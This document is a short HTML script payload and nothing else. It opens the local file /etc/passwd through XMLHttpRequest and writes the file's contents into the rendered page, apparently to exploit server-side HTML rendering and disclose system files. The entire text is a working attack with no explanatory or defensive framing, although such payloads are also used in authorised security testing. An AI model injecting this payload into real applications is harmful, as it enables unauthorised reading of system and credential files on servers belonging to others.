<script>
 x = new XMLHttpRequest();
 x.open("GET", "file:///etc/passwd", false);
 x.send();
 document.write(x.responseText);
</script>
